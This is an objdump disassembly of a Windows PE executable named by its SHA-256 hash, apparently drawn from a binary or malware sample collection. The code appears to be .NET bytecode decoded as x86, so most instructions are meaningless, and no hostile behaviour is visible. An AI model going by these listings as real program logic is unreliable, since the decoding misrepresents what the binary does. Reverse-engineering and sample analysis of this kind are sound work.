
eefac865c13477f8c890ac2990b822e5ab16a0ad2351bfb28380154ec5bc231c.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	pusha  
  402001:	je     0x402003
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x34f400
  402013:	add    BYTE PTR [esi+edi*1],al
  402016:	add    BYTE PTR [eax],al
  402018:	or     eax,DWORD PTR [eax]
  40201a:	add    BYTE PTR [eax],al
  40201c:	pop    es
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	inc    eax
  402021:	xor    DWORD PTR [eax],eax
  402023:	add    BYTE PTR [ebx+0x50000003],dh
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [esi],dh
  402051:	bound  esi,QWORD PTR [ecx+0x64]
  402054:	xchg   DWORD PTR [edi+0x65],ebp
  402057:	sub    eax,0x42b976bb
  40205c:	sbb    DWORD PTR [ebp+0x3],esp
  40205f:	fcomip st,st(3)
  402061:	jbe    0x40208e
  402063:	repz mov ?,WORD PTR [esi-0x74]
  402067:	xchg   edx,eax
  402068:	repnz adc DWORD PTR [edi-0x68],ebx
  40206c:	shl    DWORD PTR [edi-0x2],cl
  40206f:	sub    al,0x9b
  402071:	stos   BYTE PTR es:[edi],al
  402072:	dec    ebx
  402073:	or     DWORD PTR [ebx],edx
  402075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402076:	jmp    FWORD PTR [esi+0x6c8d6cfb]
  40207c:	fidiv  WORD PTR [edi+0x73]
  40207f:	fwait
  402080:	pop    es
  402081:	(bad)  
  402082:	iret   
  402083:	mov    ebx,0x1439a3ea
  402088:	aam    0xd6
  40208a:	pop    edx
  40208b:	popa   
  40208c:	rcr    bh,1
  40208e:	cmp    BYTE PTR [ebp+0x54],ah
  402091:	cmp    eax,0xc9089f5
  402096:	and    al,0xf2
  402098:	add    ecx,DWORD PTR [esi+0x49]
  40209b:	sub    DWORD PTR [ebp-0x28892a24],ebx
  4020a1:	lahf   
  4020a2:	in     al,dx
  4020a3:	add    BYTE PTR [ecx],ch
  4020a5:	push   ds
  4020a6:	popa   
  4020a7:	std    
  4020a8:	cdq    
  4020a9:	pop    ebx
  4020aa:	cdq    
  4020ab:	dec    ecx
  4020ac:	sub    DWORD PTR [eax+0x0],0x4d
  4020b0:	aam    0xae
  4020b2:	inc    edx
  4020b3:	adc    DWORD PTR [bx+di],0xf3934a32
  4020ba:	enter  0x6eba,0xcd
  4020be:	xchg   edi,eax
  4020bf:	xchg   edi,eax
  4020c0:	jmp    0xf489:0x389bd5c1
  4020c7:	mov    eax,0x6d2ff235
  4020cc:	jno    0x40214a
  4020ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020cf:	push   ds
  4020d0:	sbb    esi,DWORD PTR [eax]
  4020d2:	add    eax,0x8300
  4020d7:	add    BYTE PTR [ecx],al
  4020d9:	add    BYTE PTR [eax],al
  4020db:	adc    DWORD PTR [edx+0x1],esi
  4020de:	add    BYTE PTR [eax],al
  4020e0:	jo     0x40210a
  4020e2:	sbb    DWORD PTR [eax],eax
  4020e4:	add    BYTE PTR [edx],cl
  4020e6:	sub    BYTE PTR [edx],bl
  4020e8:	add    BYTE PTR [eax],al
  4020ea:	or     cl,BYTE PTR [edx]
  4020ec:	sub    BYTE PTR [ebx],bl
  4020ee:	add    BYTE PTR [eax],al
  4020f0:	or     dh,BYTE PTR [edx+0x51]
  4020f3:	add    BYTE PTR [eax],al
  4020f5:	jo     0x40210e
  4020f7:	lea    eax,[ecx]
  4020f9:	add    BYTE PTR [eax],al
  4020fb:	add    DWORD PTR [eax+ecx*1],ecx
  4020fe:	push   ss
  4020ff:	adc    al,BYTE PTR [eax]
  402101:	(bad)  
  402102:	push   ss
  402103:	sub    eax,DWORD PTR [eax]
  402105:	add    BYTE PTR [ecx],al
  402107:	outs   dx,DWORD PTR ds:[esi]
  402108:	sbb    al,0x0
  40210a:	add    BYTE PTR [edx],cl
  40210c:	mov    ds:0x1d2808,al
  402111:	add    BYTE PTR [edx],cl
  402113:	sub    BYTE PTR [ecx],bl
  402115:	add    BYTE PTR [eax],al
  402117:	or     ch,BYTE PTR [eax]
  402119:	push   ds
  40211a:	add    BYTE PTR [eax],al
  40211c:	or     dl,BYTE PTR [esi+edi*8]
  40211f:	push   es
  402120:	or     BYTE PTR [eax],al
  402122:	add    BYTE PTR [esi],al
  402124:	jae    0x402145
  402126:	add    BYTE PTR [eax],al
  402128:	or     ch,BYTE PTR [edi+0x20]
  40212b:	add    BYTE PTR [eax],al
  40212d:	or     dh,BYTE PTR [ebx+0x1a]
  402130:	add    BYTE PTR [eax],al
  402132:	push   es
  402133:	or     eax,DWORD PTR [edi]
  402135:	add    ch,BYTE PTR [edi+0x10]
  402138:	add    BYTE PTR [eax],al
  40213a:	push   es
  40213b:	jb     0x4020c8
  40213d:	add    BYTE PTR [eax],al
  40213f:	jo     0x402169
  402141:	sbb    DWORD PTR [eax],eax
  402143:	add    BYTE PTR [edx],cl
  402145:	pop    es
  402146:	outs   dx,DWORD PTR ds:[esi]
  402147:	push   cs
  402148:	add    BYTE PTR [eax],al
  40214a:	push   es
  40214b:	ficom  WORD PTR [ecx]
  40214d:	pop    es
  40214e:	outs   dx,DWORD PTR ds:[esi]
  40214f:	sldt   WORD PTR [eax]
  402152:	push   es
  402153:	jb     0x40213a
  402155:	add    BYTE PTR [eax],al
  402157:	jo     0x402181
  402159:	sbb    DWORD PTR [eax],eax
  40215b:	add    BYTE PTR [edx],cl
  40215d:	fsubr  QWORD PTR [edx]
  40215f:	add    BYTE PTR [ecx],al
  402161:	adc    BYTE PTR [eax],al
  402163:	add    BYTE PTR [edx],al
  402165:	add    BYTE PTR [eax+0x0],bl
  402168:	sbb    DWORD PTR [ecx+0x0],esi
  40216b:	adc    DWORD PTR [eax],eax
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    BYTE PTR [ebx],dl
  402171:	xor    BYTE PTR ds:0x2600,al
  402177:	add    BYTE PTR [edx],al
  402179:	add    BYTE PTR [eax],al
  40217b:	adc    DWORD PTR [eax],ebp
  40217d:	sbb    eax,DWORD PTR [eax]
  40217f:	add    BYTE PTR [edx],cl
  402181:	jb     0x402180
  402183:	add    BYTE PTR [eax],al
  402185:	jo     0x40219e
  402187:	lea    eax,[ecx]
  402189:	add    BYTE PTR [eax],al
  40218b:	add    DWORD PTR [edx],ecx
  40218d:	push   es
  40218e:	push   ss
  40218f:	add    ebp,DWORD PTR [edi+0x21]
  402192:	add    BYTE PTR [eax],al
  402194:	or     ah,BYTE PTR [edx+0x1d2806]
  40219a:	add    BYTE PTR [edx],cl
  40219c:	sub    BYTE PTR [ecx],bl
  40219e:	add    BYTE PTR [eax],al
  4021a0:	or     ch,BYTE PTR [edx]
  4021a2:	push   ds
  4021a3:	add    ch,BYTE PTR [eax]
  4021a5:	and    al,BYTE PTR [eax]
  4021a7:	add    BYTE PTR [edx],cl
  4021a9:	sub    al,BYTE PTR [eax]
  4021ab:	add    BYTE PTR [ebx],bl
  4021ad:	xor    BYTE PTR [edi],al
  4021af:	add    BYTE PTR [eax+0x3000000],bh
  4021b5:	add    BYTE PTR [eax],al
  4021b7:	adc    DWORD PTR [edx+0x31],esi
  4021ba:	add    DWORD PTR [eax],eax
  4021bc:	jo     0x4021d9
  4021be:	lea    eax,[ecx]
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	add    DWORD PTR ds:0x8c031609,ecx
  4021c8:	xor    BYTE PTR [eax],al
  4021ca:	add    BYTE PTR [ecx],al
  4021cc:	mov    ds:0x8c041709,al
  4021d1:	xor    BYTE PTR [eax],al
  4021d3:	add    BYTE PTR [ecx],al
  4021d5:	mov    ds:0x8c051809,al
  4021da:	xor    DWORD PTR [eax],eax
  4021dc:	add    BYTE PTR [ecx],al
  4021de:	mov    ds:0x40e1909,al
  4021e3:	mov    WORD PTR [ecx],?
  4021e5:	add    BYTE PTR [eax],al
  4021e7:	add    DWORD PTR [edx+0x50e1a09],esp
  4021ed:	mov    ds:0x232809,al
  4021f2:	add    BYTE PTR [edx],cl
  4021f4:	push   ss
  4021f5:	or     al,BYTE PTR ds:0xb14432c
  4021fb:	adc    al,BYTE PTR [ecx]
  4021fd:	sub    BYTE PTR [ebx],bh
  4021ff:	add    BYTE PTR [eax],al
  402201:	push   es
  402202:	pop    es
  402203:	sub    BYTE PTR [eax+eax*1],ah
  402206:	add    BYTE PTR [edx],cl
  402208:	sub    eax,0xde0a1702
  40220d:	and    DWORD PTR [edx+esi*2],ecx
  402210:	add    al,BYTE PTR [edx]
  402212:	add    BYTE PTR [eax+0x17],dh
  402215:	lea    eax,[ecx]
  402217:	add    BYTE PTR [eax],al
  402219:	add    DWORD PTR [ebx],edx
  40221b:	add    al,0x11
  40221d:	add    al,0x16
  40221f:	or     BYTE PTR [edi+0x1c],ch
  402222:	add    BYTE PTR [eax],al
  402224:	or     ah,BYTE PTR [edx+0x25280411]
  40222a:	add    BYTE PTR [eax],al
  40222c:	or     bl,dh
  40222e:	add    BYTE PTR [esi],al
  402230:	sub    eax,0x254720a
  402235:	add    BYTE PTR [eax+0x28],dh
  402238:	add    BYTE PTR es:[eax],al
  40223b:	or     al,BYTE PTR [esi]
  40223d:	sub    eax,0x2c040e04
  402242:	sub    al,0x72
  402244:	js     0x402248
  402246:	add    BYTE PTR [eax+0x28],dh
  402249:	sbb    DWORD PTR [eax],eax
  40224b:	add    BYTE PTR [edx],cl
  40224d:	add    eax,DWORD PTR [esi+eax*1]
  402250:	push   cs
  402251:	add    al,0xe
  402253:	add    eax,0x1906fe02
  402258:	add    BYTE PTR [eax],al
  40225a:	push   es
  40225b:	jae    0x402284
  40225d:	add    BYTE PTR [eax],al
  40225f:	or     ch,BYTE PTR [eax]
  402261:	aaa    
  402262:	add    BYTE PTR [eax],al
  402264:	push   es
  402265:	jb     0x402241
  402267:	add    al,BYTE PTR [eax]
  402269:	jo     0x402293
  40226b:	sbb    DWORD PTR [eax],eax
  40226d:	add    BYTE PTR [edx],cl
  40226f:	sub    al,BYTE PTR [ecx]
  402271:	adc    BYTE PTR [eax],al
  402273:	add    BYTE PTR [eax],al
  402275:	add    BYTE PTR [ebx+0x0],al
  402278:	adc    edx,DWORD PTR [esi+0x0]
  40227b:	and    DWORD PTR [edx],esi
  40227d:	add    BYTE PTR [eax],al
  40227f:	add    DWORD PTR [edx+0x72],ebp
  402282:	push   esp
  402283:	add    eax,DWORD PTR [eax]
  402285:	jo     0x4022af
  402287:	sbb    DWORD PTR [eax],eax
  402289:	add    BYTE PTR [edx],cl
  40228b:	sub    BYTE PTR [ecx],bh
  40228d:	add    BYTE PTR [eax],al
  40228f:	push   es
  402290:	jb     0x40221c
  402292:	add    eax,DWORD PTR [eax]
  402294:	jo     0x4022be
  402296:	sbb    DWORD PTR [eax],eax
  402298:	add    BYTE PTR [edx],cl
  40229a:	sub    ch,BYTE PTR [edx+0x72]
  40229d:	fiadd  WORD PTR [ebx]
  40229f:	add    BYTE PTR [eax+0x28],dh
  4022a2:	sbb    DWORD PTR [eax],eax
  4022a4:	add    BYTE PTR [edx],cl
  4022a6:	sub    BYTE PTR [edx],bh
  4022a8:	add    BYTE PTR [eax],al
  4022aa:	push   es
  4022ab:	jb     0x4022c3
  4022ad:	add    al,0x0
  4022af:	jo     0x4022d9
  4022b1:	sbb    DWORD PTR [eax],eax
  4022b3:	add    BYTE PTR [edx],cl
  4022b5:	sub    al,BYTE PTR [eax]
  4022b7:	add    BYTE PTR [ebx],bl
  4022b9:	xor    BYTE PTR [edx],al
  4022bb:	add    BYTE PTR [esi+0x0],dl
  4022be:	add    BYTE PTR [eax],al
  4022c0:	add    al,0x0
  4022c2:	add    BYTE PTR [ecx],dl
  4022c4:	push   ss
  4022c5:	or     al,BYTE PTR [edx]
  4022c7:	jnp    0x4022d0
  4022c9:	add    BYTE PTR [eax],al
  4022cb:	add    al,0x25
  4022cd:	or     edx,DWORD PTR [edx]
  4022cf:	add    BYTE PTR [eax],ch
  4022d1:	sub    BYTE PTR [eax],al
  4022d3:	add    BYTE PTR [edx],cl
  4022d5:	add    bh,BYTE PTR [ebx+0x4]
  4022d8:	add    BYTE PTR [eax],al
  4022da:	add    al,0x2c
  4022dc:	xor    BYTE PTR [edx+0x6c],dh
  4022df:	add    al,0x0
  4022e1:	jo     0x40230b
  4022e3:	sbb    DWORD PTR [eax],eax
  4022e5:	add    BYTE PTR [edx],cl
  4022e7:	sub    BYTE PTR [eax],bh
  4022e9:	add    BYTE PTR [eax],al
  4022eb:	push   es
  4022ec:	ficomp WORD PTR [edi]
  4022ee:	add    bh,BYTE PTR [ebx+0x4]
  4022f1:	add    BYTE PTR [eax],al
  4022f3:	add    al,0x6f
  4022f5:	sub    DWORD PTR [eax],eax
  4022f7:	add    BYTE PTR [edx],cl
  4022f9:	add    bh,BYTE PTR es:[ebx+0x4]
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	add    al,0x6f
  402301:	sub    al,BYTE PTR [eax]
  402303:	add    BYTE PTR [edx],cl
  402305:	add    dl,BYTE PTR [edi*2+0x4000004]
  40230c:	(bad)  
  40230e:	or     al,BYTE PTR [esi]
  402310:	sub    al,0x6
  402312:	pop    es
  402313:	sub    BYTE PTR [ebx],ch
  402315:	add    BYTE PTR [eax],al
  402317:	or     bl,ah
  402319:	sub    al,BYTE PTR [eax]
  40231b:	add    BYTE PTR [ecx],al
  40231d:	sbb    al,0x0
  40231f:	add    BYTE PTR [edx],al
  402321:	add    BYTE PTR [ebx],ah
  402323:	add    BYTE PTR [edi],al
  402325:	sub    al,BYTE PTR [eax]
  402327:	pop    ds
  402328:	add    BYTE PTR [eax],al
  40232a:	add    BYTE PTR [eax],al
  40232c:	add    al,BYTE PTR [eax]
  40232e:	add    al,BYTE PTR [eax]
  402330:	dec    ecx
  402331:	dec    ebx
  402332:	add    BYTE PTR [edx],cl
  402334:	add    BYTE PTR [eax],al
  402336:	add    BYTE PTR [eax],al
  402338:	adc    esi,DWORD PTR [eax]
  40233a:	add    eax,DWORD PTR [eax]
  40233c:	cmp    DWORD PTR [eax],eax
  40233e:	add    BYTE PTR [eax],al
  402340:	add    eax,0x18110000
  402345:	lea    esi,ds:0xb010000
  40234b:	pop    es
  40234c:	push   ss
  40234d:	add    bh,BYTE PTR [ebx+0x4]
  402350:	add    BYTE PTR [eax],al
  402352:	add    al,0xa2
  402354:	pop    es
  402355:	pop    ss
  402356:	add    bh,BYTE PTR [ebx+0x5]
  402359:	add    BYTE PTR [eax],al
  40235b:	add    al,0xa2
  40235d:	pop    es
  40235e:	sub    BYTE PTR [eax+eax*1],ch
  402361:	add    BYTE PTR [edx],cl
  402363:	or     al,BYTE PTR [esi]
  402365:	sub    eax,0x4b6720b
  40236a:	add    BYTE PTR [eax+0x28],dh
  40236d:	sbb    DWORD PTR [eax],eax
  40236f:	add    BYTE PTR [edx],cl
  402371:	sub    dh,BYTE PTR [edx+0x14]
  402374:	add    eax,0x19287000
  402379:	add    BYTE PTR [eax],al
  40237b:	or     ch,BYTE PTR [edx]
  40237d:	add    BYTE PTR [eax],al
  40237f:	add    BYTE PTR [ebx],bl
  402381:	xor    BYTE PTR [edx],al
  402383:	add    BYTE PTR ds:0x4000000,bh
  402389:	add    BYTE PTR [eax],al
  40238b:	adc    DWORD PTR [esi],edx
  40238d:	or     al,BYTE PTR [edx]
  40238f:	jnp    0x402398
  402391:	add    BYTE PTR [eax],al
  402393:	add    al,0x25
  402395:	or     edx,DWORD PTR [edx]
  402397:	add    BYTE PTR [eax],ch
  402399:	sub    BYTE PTR [eax],al
  40239b:	add    BYTE PTR [edx],cl
  40239d:	add    bh,dh
  40239f:	adc    edi,DWORD PTR [ebx+0x6]
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	add    al,0x2d
  4023a6:	adc    eax,0x13fe1702
  4023ab:	jge    0x4023b3
  4023ad:	add    BYTE PTR [eax],al
  4023af:	add    al,0x2
  4023b1:	sub    BYTE PTR ds:0x2060000,cl
  4023b7:	sub    BYTE PTR [ebx],dl
  4023b9:	add    BYTE PTR [eax],al
  4023bb:	push   es
  4023bc:	fimul  WORD PTR [edx]
  4023be:	push   es
  4023bf:	sub    al,0x6
  4023c1:	pop    es
  4023c2:	sub    BYTE PTR [ebx],ch
  4023c4:	add    BYTE PTR [eax],al
  4023c6:	or     bl,ah
  4023c8:	sub    al,BYTE PTR [eax]
  4023ca:	add    BYTE PTR [eax],al
  4023cc:	add    DWORD PTR [eax],edx
  4023ce:	add    BYTE PTR [eax],al
  4023d0:	add    al,BYTE PTR [eax]
  4023d2:	add    al,BYTE PTR [eax]
  4023d4:	xor    BYTE PTR [edx],dh
  4023d6:	add    BYTE PTR [edx],cl
  4023d8:	add    BYTE PTR [eax],al
  4023da:	add    BYTE PTR [eax],al
  4023dc:	add    esi,DWORD PTR [eax]
  4023de:	add    al,BYTE PTR [eax]
  4023e0:	inc    ebp
  4023e1:	add    BYTE PTR [eax],al
  4023e3:	add    BYTE PTR [eax],al
  4023e5:	add    BYTE PTR [eax],al
  4023e7:	add    BYTE PTR [edx],al
  4023e9:	add    ebp,DWORD PTR [eax]
  4023eb:	adc    al,0x0
  4023ed:	add    BYTE PTR [esi],al
  4023ef:	add    dl,BYTE PTR [edi*2+0x4000008]
  4023f6:	add    dl,BYTE PTR [esi]
  4023f8:	jae    0x402427
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	or     bh,BYTE PTR [ebp+0x5]
  4023ff:	add    BYTE PTR [eax],al
  402401:	add    al,0x2
  402403:	jnp    0x402407
  402405:	add    BYTE PTR [eax],al
  402407:	add    al,0x6f
  402409:	and    DWORD PTR [eax],eax
  40240b:	add    BYTE PTR [esi],al
  40240d:	sub    BYTE PTR [eax+eax*1],ah
  402410:	add    BYTE PTR [edx],cl
  402412:	sub    eax,0x27b0218
  402417:	add    BYTE PTR [eax],al
  402419:	add    al,0x6f
  40241b:	and    eax,DWORD PTR [eax]
  40241d:	add    BYTE PTR [esi],al
  40241f:	sub    BYTE PTR [eax+eax*1],ah
  402422:	add    BYTE PTR [edx],cl
  402424:	sub    eax,0x11280206
  402429:	add    BYTE PTR [eax],al
  40242b:	push   es
  40242c:	sub    al,BYTE PTR [eax]
  40242e:	add    BYTE PTR [eax],al
  402430:	sbb    esi,DWORD PTR [eax]
  402432:	add    eax,0xc300
  402437:	add    BYTE PTR [esi],al
  402439:	add    BYTE PTR [eax],al
  40243b:	adc    DWORD PTR [edx],eax
  40243d:	jnp    0x402442
  40243f:	add    BYTE PTR [eax],al
  402441:	add    al,0x2c
  402443:	push   es
  402444:	add    ch,BYTE PTR [eax]
  402446:	adc    eax,DWORD PTR [eax]
  402448:	add    BYTE PTR [esi],al
  40244a:	add    al,BYTE PTR [edx]
  40244c:	sub    BYTE PTR [edx],dl
  40244e:	add    BYTE PTR [eax],al
  402450:	push   es
  402451:	jge    0x402456
  402453:	add    BYTE PTR [eax],al
  402455:	add    al,0x2
  402457:	sub    BYTE PTR [esi],ch
  402459:	add    BYTE PTR [eax],al
  40245b:	or     ah,BYTE PTR [esi]
  40245d:	sub    BYTE PTR [ebx],bl
  40245f:	add    BYTE PTR [eax],al
  402461:	or     dh,BYTE PTR [edx+0x7a]
  402464:	add    eax,0x8d187000
  402469:	add    DWORD PTR [eax],eax
  40246b:	add    BYTE PTR [ecx],al
  40246d:	or     al,0x8
  40246f:	push   ss
  402470:	add    bh,BYTE PTR [ebx+0x2]
  402473:	add    BYTE PTR [eax],al
  402475:	add    al,0x6f
  402477:	and    DWORD PTR [eax],eax
  402479:	add    BYTE PTR [esi],al
  40247b:	mov    ds:0x7b021708,al
  402480:	add    al,BYTE PTR [eax]
  402482:	add    BYTE PTR [edi+ebp*2],al
  402485:	and    eax,DWORD PTR [eax]
  402487:	add    BYTE PTR [esi],al
  402489:	mov    ds:0x1d2808,al
  40248e:	add    BYTE PTR [edx],cl
  402490:	or     al,BYTE PTR [edx]
  402492:	rol    BYTE PTR [edx],1
  402494:	add    BYTE PTR [eax],al
  402496:	add    ch,BYTE PTR [eax]
  402498:	das    
  402499:	add    BYTE PTR [eax],al
  40249b:	or     al,BYTE PTR [esi]
  40249d:	sub    BYTE PTR [eax],dh
  40249f:	add    BYTE PTR [eax],al
  4024a1:	or     dh,BYTE PTR [ebx+eax*1+0x0]
  4024a5:	add    BYTE PTR [edx],al
  4024a7:	jge    0x4024b1
  4024a9:	add    BYTE PTR [eax],al
  4024ab:	add    al,0x72
  4024ad:	xchg   esi,eax
  4024ae:	add    eax,0x19287000
  4024b3:	add    BYTE PTR [eax],al
  4024b5:	or     al,BYTE PTR [edx]
  4024b7:	jnp    0x4024c1
  4024b9:	add    BYTE PTR [eax],al
  4024bb:	add    al,0x2
  4024bd:	jnp    0x4024c1
  4024bf:	add    BYTE PTR [eax],al
  4024c1:	add    al,0x6f
  4024c3:	and    DWORD PTR [eax],eax
  4024c5:	add    BYTE PTR [esi],al
  4024c7:	add    ch,BYTE PTR [edi+0x5]
  4024ca:	add    BYTE PTR [eax],al
  4024cc:	push   es
  4024cd:	jb     0x4024ec
  4024cf:	push   es
  4024d0:	add    BYTE PTR [eax+0x28],dh
  4024d3:	sbb    DWORD PTR [eax],eax
  4024d5:	add    BYTE PTR [edx],cl
  4024d7:	fisub  WORD PTR ds:0x6c4720b
  4024dd:	add    BYTE PTR [eax+0x17],dh
  4024e0:	lea    eax,[ecx]
  4024e2:	add    BYTE PTR [eax],al
  4024e4:	add    DWORD PTR ds:0xa2071609,ecx
  4024ea:	or     DWORD PTR [eax],ebp
  4024ec:	xor    DWORD PTR [eax],eax
  4024ee:	add    BYTE PTR [edx],cl
  4024f0:	add    ch,BYTE PTR [eax]
  4024f2:	adc    eax,DWORD PTR [eax]
  4024f4:	add    BYTE PTR [esi],al
  4024f6:	adc    eax,0x3228
  4024fb:	or     bl,dh
  4024fd:	add    BYTE PTR [edx],ch
  4024ff:	add    BYTE PTR [ecx],al
  402501:	adc    BYTE PTR [eax],al
  402503:	add    BYTE PTR [eax],al
  402505:	add    BYTE PTR [esi],cl
  402507:	add    BYTE PTR [edi+0x3225009d],cl
  40250d:	add    BYTE PTR [eax],al
  40250f:	add    DWORD PTR [ebx],edx
  402511:	xor    BYTE PTR [esi],al
  402513:	add    bl,cl
  402515:	add    BYTE PTR [eax],al
  402517:	add    BYTE PTR [edi],al
  402519:	add    BYTE PTR [eax],al
  40251b:	adc    DWORD PTR [eax],ebp
  40251d:	sbb    eax,DWORD PTR [eax]
  40251f:	add    BYTE PTR [edx],cl
  402521:	jb     0x402578
  402523:	pop    es
  402524:	add    BYTE PTR [eax+0x18],dh
  402527:	lea    eax,[ecx]
  402529:	add    BYTE PTR [eax],al
  40252b:	add    DWORD PTR [ebx],edx
  40252d:	add    al,0x11
  40252f:	add    al,0x16
  402531:	sub    BYTE PTR [ebx],dh
  402533:	add    BYTE PTR [eax],al
  402535:	or     ch,BYTE PTR [edi+0x34]
  402538:	add    BYTE PTR [eax],al
  40253a:	or     ah,BYTE PTR [edx+0x28170411]
  402540:	sbb    al,BYTE PTR [eax]
  402542:	add    BYTE PTR [edx],cl
  402544:	adc    eax,DWORD PTR ds:0x35280512
  40254a:	add    BYTE PTR [eax],al
  40254c:	or     cl,BYTE PTR [esp+edi*1-0x5dff0000]
  402553:	adc    DWORD PTR [eax+ebp*1],eax
  402556:	sbb    eax,0xa0a0000
  40255b:	jb     0x4025c2
  40255d:	pop    es
  40255e:	add    BYTE PTR [eax+0x17],dh
  402561:	lea    eax,[ecx]
  402563:	add    BYTE PTR [eax],al
  402565:	add    DWORD PTR [ebx],edx
  402567:	push   es
  402568:	adc    DWORD PTR [esi],eax
  40256a:	push   ss
  40256b:	push   es
  40256c:	mov    ds:0x23280611,al
  402571:	add    BYTE PTR [eax],al
  402573:	or     dh,BYTE PTR [ebx+0x36]
  402576:	add    BYTE PTR [eax],al
  402578:	or     cl,BYTE PTR [ebx]
  40257a:	pop    es
  40257b:	jb     0x402577
  40257d:	pop    es
  40257e:	add    BYTE PTR [eax+0x7],dh
  402581:	jb     0x40258f
  402583:	or     BYTE PTR [eax],al
  402585:	jo     0x40258d
  402587:	and    eax,0x376f0713
  40258c:	add    BYTE PTR [eax],al
  40258e:	or     dl,BYTE PTR [ecx]
  402590:	pop    es
  402591:	outs   dx,DWORD PTR ds:[esi]
  402592:	aaa    
  402593:	add    BYTE PTR [eax],al
  402595:	or     al,BYTE PTR [edi]
  402597:	jb     0x4025af
  402599:	or     BYTE PTR [eax],al
  40259b:	jo     0x4025c5
  40259d:	cmp    BYTE PTR [eax],al
  40259f:	add    BYTE PTR [edx],cl
  4025a1:	outs   dx,DWORD PTR ds:[esi]
  4025a2:	cmp    DWORD PTR [eax],eax
  4025a4:	add    BYTE PTR [edx],cl
  4025a6:	outs   dx,DWORD PTR ds:[esi]
  4025a7:	aaa    
  4025a8:	add    BYTE PTR [eax],al
  4025aa:	or     dh,BYTE PTR [ebx+0x3a]
  4025ad:	add    BYTE PTR [eax],al
  4025af:	or     cl,BYTE PTR [eax+ecx*1]
  4025b2:	sbb    DWORD PTR [edi+0x3b],ebp
  4025b5:	add    BYTE PTR [eax],al
  4025b7:	or     al,BYTE PTR [edi]
  4025b9:	jae    0x4025f7
  4025bb:	add    BYTE PTR [eax],al
  4025bd:	or     cl,BYTE PTR [eax]
  4025bf:	jae    0x4025fe
  4025c1:	add    BYTE PTR [eax],al
  4025c3:	or     cl,BYTE PTR ds:0x3e281609
  4025c9:	add    BYTE PTR [eax],al
  4025cb:	or     dh,BYTE PTR [edx+0x36]
  4025ce:	or     BYTE PTR [eax],al
  4025d0:	jo     0x4025e9
  4025d2:	lea    eax,[ecx]
  4025d4:	add    BYTE PTR [eax],al
  4025d6:	add    DWORD PTR [ebx],edx
  4025d8:	or     BYTE PTR [ecx],dl
  4025da:	or     BYTE PTR [esi],dl
  4025dc:	push   es
  4025dd:	mov    ds:0x23280811,al
  4025e2:	add    BYTE PTR [eax],al
  4025e4:	or     cl,BYTE PTR [ecx]
  4025e6:	sub    al,BYTE PTR [eax]
  4025e8:	sbb    esi,DWORD PTR [eax]
  4025ea:	add    al,0x0
  4025ec:	pop    eax
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	add    BYTE PTR [eax],cl
  4025f1:	add    BYTE PTR [eax],al
  4025f3:	adc    DWORD PTR [edx],eax
  4025f5:	jnp    0x4025fa
  4025f7:	add    BYTE PTR [eax],al
  4025f9:	add    al,0x2c
  4025fb:	sub    eax,0x8e372
  402600:	jo     0x40262a
  402602:	sbb    DWORD PTR [eax],eax
  402604:	add    BYTE PTR [edx],cl
  402606:	add    ch,BYTE PTR [eax]
  402608:	aas    
  402609:	add    BYTE PTR [eax],al
  40260b:	or     ah,BYTE PTR [esi]
  40260d:	add    bh,BYTE PTR [ebx+0x3]
  402610:	add    BYTE PTR [eax],al
  402612:	add    al,0x28
  402614:	inc    eax
  402615:	add    BYTE PTR [eax],al
  402617:	or     al,BYTE PTR [edx]
  402619:	adc    al,0x7d
  40261b:	add    eax,DWORD PTR [eax]
  40261d:	add    BYTE PTR [edx+esi*2],al
  402620:	pop    ds
  402621:	or     DWORD PTR [eax],eax
  402623:	jo     0x40264d
  402625:	sbb    DWORD PTR [eax],eax
  402627:	add    BYTE PTR [edx],cl
  402629:	fisub  WORD PTR [eax]
  40262b:	or     dh,BYTE PTR [edx+0x53]
  40262e:	or     DWORD PTR [eax],eax
  402630:	jo     0x402649
  402632:	lea    eax,[ecx]
  402634:	add    BYTE PTR [eax],al
  402636:	add    DWORD PTR [ebx],ecx
  402638:	pop    es
  402639:	push   ss
  40263a:	push   es
  40263b:	mov    ds:0x312807,al
  402640:	add    BYTE PTR [edx],cl
  402642:	add    dl,BYTE PTR [edi*2+0x4000003]
  402649:	fiadd  WORD PTR [eax]
  40264b:	sub    al,BYTE PTR [ecx]
  40264d:	adc    BYTE PTR [eax],al
  40264f:	add    BYTE PTR [eax],al
  402651:	add    BYTE PTR [eax],al
  402653:	add    BYTE PTR [edi],dh
  402655:	aaa    
  402656:	add    BYTE PTR [eax],ah
  402658:	xor    al,BYTE PTR [eax]
  40265a:	add    BYTE PTR [ecx],al
  40265c:	add    esi,DWORD PTR [eax]
  40265e:	add    eax,DWORD PTR [eax]
  402660:	push   edi
  402661:	add    BYTE PTR [eax],al
  402663:	add    BYTE PTR [eax],al
  402665:	add    BYTE PTR [eax],al
  402667:	add    BYTE PTR [edx],al
  402669:	jnp    0x40266d
  40266b:	add    BYTE PTR [eax],al
  40266d:	add    al,0x3
  40266f:	outs   dx,DWORD PTR ds:[esi]
  402670:	xor    DWORD PTR [eax],eax
  402672:	add    BYTE PTR [esi],al
  402674:	add    bh,BYTE PTR [ebx+0x2]
  402677:	add    BYTE PTR [eax],al
  402679:	add    al,0x6f
  40267b:	pop    ds
  40267c:	add    BYTE PTR [eax],al
  40267e:	push   es
  40267f:	sub    al,0x37
  402681:	add    bh,BYTE PTR [ebx+0x2]
  402684:	add    BYTE PTR [eax],al
  402686:	add    al,0x6f
  402688:	pop    ds
  402689:	add    BYTE PTR [eax],al
  40268b:	push   es
  40268c:	pop    ss
  40268d:	outs   dx,DWORD PTR ds:[esi]
  40268e:	inc    ecx
  40268f:	add    BYTE PTR [eax],al
  402691:	or     al,BYTE PTR [edx]
  402693:	jnp    0x402697
  402695:	add    BYTE PTR [eax],al
